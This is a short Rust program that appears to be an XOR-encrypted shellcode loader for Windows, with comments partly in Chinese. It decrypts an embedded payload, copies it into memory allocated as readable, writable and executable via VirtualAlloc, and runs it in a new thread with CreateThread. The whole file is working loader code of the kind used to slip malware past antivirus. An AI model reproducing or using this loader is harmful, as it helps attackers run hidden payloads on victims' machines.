use std::mem::transmute;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use xor_loader_fb0sh::*;

fn main() {
    // 条件编译 lib.rs
    // file read // wget ?
    let (k, esc) = p_in(ksc);
    println!("k: {:?}\n esc: {:?}", k, esc);
    e(&dec(&k, &esc));
}

fn e(sc: &[u8]) {
    unsafe {
        let ptr = VirtualAlloc(std::ptr::null_mut(), sc.len(), 0x00001000, 0x40);

        if GetLastError() == 0 {
            std::ptr::copy(sc.as_ptr() as *const u8, ptr as *mut u8, sc.len());

            let mut threadid = 0;
            let threadhandle = CreateThread(
                std::ptr::null_mut(),
                0,
                Some(transmute(ptr)),
                std::ptr::null_mut(),
                0,
                &mut threadid,
            );

            WaitForSingleObject(threadhandle, 0xFFFFFFFF);
        } else {
            println!("执行失败：{}", GetLastError());
        }
    }
}
